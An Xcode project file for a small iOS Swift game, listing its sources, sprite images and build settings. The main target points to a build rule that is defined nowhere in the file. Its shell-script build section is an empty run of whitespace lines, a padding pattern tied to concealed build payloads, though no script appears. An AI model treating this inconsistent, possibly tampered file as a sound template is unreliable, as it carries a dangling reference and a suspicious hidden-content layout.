// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 48;
	objects = {

/* Begin PBXBuildFile section */
		F2FFA79B1FDA47DB005A3E45 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2FFA79A1FDA47DB005A3E45 /* AppDelegate.swift */; };
		F2FFA79D1FDA47DB005A3E45 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2FFA79C1FDA47DB005A3E45 /* ViewController.swift */; };
		F2FFA7A01FDA47DB005A3E45 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F2FFA79E1FDA47DB005A3E45 /* Main.storyboard */; };
		F2FFA7A21FDA47DB005A3E45 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = F2FFA7A11FDA47DB005A3E45 /* Assets.xcassets */; };
		F2FFA7A51FDA47DB005A3E45 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F2FFA7A31FDA47DB005A3E45 /* LaunchScreen.storyboard */; };
		F2FFA7B01FDA47DB005A3E45 /* swift_game_gc1Tests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2FFA7AF1FDA47DB005A3E45 /* swift_game_gc1Tests.swift */; };
		F2FFA7BB1FDA47DB005A3E45 /* swift_game_gc1UITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2FFA7BA1FDA47DB005A3E45 /* swift_game_gc1UITests.swift */; };
		F2FFA7C91FDA4834005A3E45 /* SecondScene.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2FFA7C81FDA4834005A3E45 /* SecondScene.swift */; };
		F2FFA7CC1FDA4865005A3E45 /* human(smail)的副本.png in Resources */ = {isa = PBXBuildFile; fileRef = F2FFA7CA1FDA485A005A3E45 /* human(smail)的副本.png */; };
		F2FFA7CD1FDA4868005A3E45 /* monster(a)small.png in Resources */ = {isa = PBXBuildFile; fileRef = F2FFA7CB1FDA4861005A3E45 /* monster(a)small.png */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		F2FFA7AC1FDA47DB005A3E45 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = F2FFA78F1FDA47DB005A3E45 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F2FFA7961FDA47DB005A3E45;
			remoteInfo = "swift game gc1";
		};
		F2FFA7B71FDA47DB005A3E45 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = F2FFA78F1FDA47DB005A3E45 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F2FFA7961FDA47DB005A3E45;
			remoteInfo = "swift game gc1";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		F2FFA7971FDA47DB005A3E45 /* swift game gc1.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "swift game gc1.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		F2FFA79A1FDA47DB005A3E45 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		F2FFA79C1FDA47DB005A3E45 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		F2FFA79F1FDA47DB005A3E45 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		F2FFA7A11FDA47DB005A3E45 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		F2FFA7A41FDA47DB005A3E45 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		F2FFA7A61FDA47DB005A3E45 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F2FFA7AB1FDA47DB005A3E45 /* swift game gc1Tests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "swift game gc1Tests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		F2FFA7AF1FDA47DB005A3E45 /* swift_game_gc1Tests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = swift_game_gc1Tests.swift; sourceTree = "<group>"; };
		F2FFA7B11FDA47DB005A3E45 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F2FFA7B61FDA47DB005A3E45 /* swift game gc1UITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "swift game gc1UITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		F2FFA7BA1FDA47DB005A3E45 /* swift_game_gc1UITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = swift_game_gc1UITests.swift; sourceTree = "<group>"; };
		F2FFA7BC1FDA47DB005A3E45 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F2FFA7C81FDA4834005A3E45 /* SecondScene.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecondScene.swift; sourceTree = "<group>"; };
		F2FFA7CA1FDA485A005A3E45 /* human(smail)的副本.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; name = "human(smail)的副本.png"; path = "../../swift UI gc3(2017.10程序设计)/image/human(smail)的副本.png"; sourceTree = "<group>"; };
		F2FFA7CB1FDA4861005A3E45 /* monster(a)small.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; name = "monster(a)small.png"; path = "../../swift UI gc3(2017.10程序设计)/image/equip/monster(a)small.png"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		F2FFA7941FDA47DB005A3E45 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F2FFA7A81FDA47DB005A3E45 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F2FFA7B31FDA47DB005A3E45 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		F2FFA78E1FDA47DB005A3E45 = {
			isa = PBXGroup;
			children = (
				F2FFA7991FDA47DB005A3E45 /* swift game gc1 */,
				F2FFA7AE1FDA47DB005A3E45 /* swift game gc1Tests */,
				F2FFA7B91FDA47DB005A3E45 /* swift game gc1UITests */,
				F2FFA7981FDA47DB005A3E45 /* Products */,
			);
			sourceTree = "<group>";
		};
		F2FFA7981FDA47DB005A3E45 /* Products */ = {
			isa = PBXGroup;
			children = (
				F2FFA7971FDA47DB005A3E45 /* swift game gc1.app */,
				F2FFA7AB1FDA47DB005A3E45 /* swift game gc1Tests.xctest */,
				F2FFA7B61FDA47DB005A3E45 /* swift game gc1UITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		F2FFA7991FDA47DB005A3E45 /* swift game gc1 */ = {
			isa = PBXGroup;
			children = (
				F2FFA7CA1FDA485A005A3E45 /* human(smail)的副本.png */,
				F2FFA7CB1FDA4861005A3E45 /* monster(a)small.png */,
				F2FFA79A1FDA47DB005A3E45 /* AppDelegate.swift */,
				F2FFA79C1FDA47DB005A3E45 /* ViewController.swift */,
				F2FFA7C81FDA4834005A3E45 /* SecondScene.swift */,
				F2FFA79E1FDA47DB005A3E45 /* Main.storyboard */,
				F2FFA7A11FDA47DB005A3E45 /* Assets.xcassets */,
				F2FFA7A31FDA47DB005A3E45 /* LaunchScreen.storyboard */,
				F2FFA7A61FDA47DB005A3E45 /* Info.plist */,
			);
			path = "swift game gc1";
			sourceTree = "<group>";
		};
		F2FFA7AE1FDA47DB005A3E45 /* swift game gc1Tests */ = {
			isa = PBXGroup;
			children = (
				F2FFA7AF1FDA47DB005A3E45 /* swift_game_gc1Tests.swift */,
				F2FFA7B11FDA47DB005A3E45 /* Info.plist */,
			);
			path = "swift game gc1Tests";
			sourceTree = "<group>";
		};
		F2FFA7B91FDA47DB005A3E45 /* swift game gc1UITests */ = {
			isa = PBXGroup;
			children = (
				F2FFA7BA1FDA47DB005A3E45 /* swift_game_gc1UITests.swift */,
				F2FFA7BC1FDA47DB005A3E45 /* Info.plist */,
			);
			path = "swift game gc1UITests";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		F2FFA7961FDA47DB005A3E45 /* swift game gc1 */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F2FFA7BF1FDA47DB005A3E45 /* Build configuration list for PBXNativeTarget "swift game gc1" */;
			buildPhases = (
				F2FFA7931FDA47DB005A3E45 /* Sources */,
				F2FFA7941FDA47DB005A3E45 /* Frameworks */,
				F2FFA7951FDA47DB005A3E45 /* Resources */,
			);
			buildRules = (
				182E0113D3AA2FD2F76D902C /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = "swift game gc1";
			productName = "swift game gc1";
			productReference = F2FFA7971FDA47DB005A3E45 /* swift game gc1.app */;
			productType = "com.apple.product-type.application";
		};
		F2FFA7AA1FDA47DB005A3E45 /* swift game gc1Tests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F2FFA7C21FDA47DB005A3E45 /* Build configuration list for PBXNativeTarget "swift game gc1Tests" */;
			buildPhases = (
				F2FFA7A71FDA47DB005A3E45 /* Sources */,
				F2FFA7A81FDA47DB005A3E45 /* Frameworks */,
				F2FFA7A91FDA47DB005A3E45 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				F2FFA7AD1FDA47DB005A3E45 /* PBXTargetDependency */,
			);
			name = "swift game gc1Tests";
			productName = "swift game gc1Tests";
			productReference = F2FFA7AB1FDA47DB005A3E45 /* swift game gc1Tests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		F2FFA7B51FDA47DB005A3E45 /* swift game gc1UITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F2FFA7C51FDA47DB005A3E45 /* Build configuration list for PBXNativeTarget "swift game gc1UITests" */;
			buildPhases = (
				F2FFA7B21FDA47DB005A3E45 /* Sources */,
				F2FFA7B31FDA47DB005A3E45 /* Frameworks */,
				F2FFA7B41FDA47DB005A3E45 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				F2FFA7B81FDA47DB005A3E45 /* PBXTargetDependency */,
			);
			name = "swift game gc1UITests";
			productName = "swift game gc1UITests";
			productReference = F2FFA7B61FDA47DB005A3E45 /* swift game gc1UITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		F2FFA78F1FDA47DB005A3E45 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 0900;
				LastUpgradeCheck = 1010;
				ORGANIZATIONNAME = dxjerry;
				TargetAttributes = {
					F2FFA7961FDA47DB005A3E45 = {
						CreatedOnToolsVersion = 9.0;
						ProvisioningStyle = Automatic;
					};
					F2FFA7AA1FDA47DB005A3E45 = {
						CreatedOnToolsVersion = 9.0;
						ProvisioningStyle = Automatic;
						TestTargetID = F2FFA7961FDA47DB005A3E45;
					};
					F2FFA7B51FDA47DB005A3E45 = {
						CreatedOnToolsVersion = 9.0;
						ProvisioningStyle = Automatic;
						TestTargetID = F2FFA7961FDA47DB005A3E45;
					};
				};
			};
			buildConfigurationList = F2FFA7921FDA47DB005A3E45 /* Build configuration list for PBXProject "swift game gc1" */;
			compatibilityVersion = "Xcode 8.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = F2FFA78E1FDA47DB005A3E45;
			productRefGroup = F2FFA7981FDA47DB005A3E45 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				F2FFA7961FDA47DB005A3E45 /* swift game gc1 */,
				F2FFA7AA1FDA47DB005A3E45 /* swift game gc1Tests */,
				F2FFA7B51FDA47DB005A3E45 /* swift game gc1UITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		F2FFA7951FDA47DB005A3E45 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F2FFA7A51FDA47DB005A3E45 /* LaunchScreen.storyboard in Resources */,
				F2FFA7CC1FDA4865005A3E45 /* human(smail)的副本.png in Resources */,
				F2FFA7CD1FDA4868005A3E45 /* monster(a)small.png in Resources */,
				F2FFA7A21FDA47DB005A3E45 /* Assets.xcassets in Resources */,
				F2FFA7A01FDA47DB005A3E45 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F2FFA7A91FDA47DB005A3E45 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F2FFA7B41FDA47DB005A3E45 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		F2FFA7931FDA47DB005A3E45 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F2FFA7C91FDA4834005A3E45 /* SecondScene.swift in Sources */,
				F2FFA79D1FDA47DB005A3E45 /* ViewController.swift in Sources */,
				F2FFA79B1FDA47DB005A3E45 /* AppDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F2FFA7A71FDA47DB005A3E45 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F2FFA7B01FDA47DB005A3E45 /* swift_game_gc1Tests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F2FFA7B21FDA47DB005A3E45 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F2FFA7BB1FDA47DB005A3E45 /* swift_game_gc1UITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		F2FFA7AD1FDA47DB005A3E45 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F2FFA7961FDA47DB005A3E45 /* swift game gc1 */;
			targetProxy = F2FFA7AC1FDA47DB005A3E45 /* PBXContainerItemProxy */;
		};
		F2FFA7B81FDA47DB005A3E45 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F2FFA7961FDA47DB005A3E45 /* swift game gc1 */;
			targetProxy = F2FFA7B71FDA47DB005A3E45 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		F2FFA79E1FDA47DB005A3E45 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F2FFA79F1FDA47DB005A3E45 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		F2FFA7A31FDA47DB005A3E45 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F2FFA7A41FDA47DB005A3E45 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		F2FFA7BD1FDA47DB005A3E45 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		F2FFA7BE1FDA47DB005A3E45 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				SDKROOT = iphoneos;
				SWIFT_OPTIMIZATION_LEVEL = "-Owholemodule";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		F2FFA7C01FDA47DB005A3E45 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = WLKWQU542Y;
				INFOPLIST_FILE = "swift game gc1/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
				PRODUCT_BUNDLE_IDENTIFIER = "com.dxjerry.swift-game-gc1";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		F2FFA7C11FDA47DB005A3E45 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = WLKWQU542Y;
				INFOPLIST_FILE = "swift game gc1/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
				PRODUCT_BUNDLE_IDENTIFIER = "com.dxjerry.swift-game-gc1";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		F2FFA7C31FDA47DB005A3E45 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "swift game gc1Tests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
				PRODUCT_BUNDLE_IDENTIFIER = "com.dxjerry.swift-game-gc1Tests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/swift game gc1.app/swift game gc1";
			};
			name = Debug;
		};
		F2FFA7C41FDA47DB005A3E45 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "swift game gc1Tests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
				PRODUCT_BUNDLE_IDENTIFIER = "com.dxjerry.swift-game-gc1Tests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/swift game gc1.app/swift game gc1";
			};
			name = Release;
		};
		F2FFA7C61FDA47DB005A3E45 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "swift game gc1UITests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
				PRODUCT_BUNDLE_IDENTIFIER = "com.dxjerry.swift-game-gc1UITests";
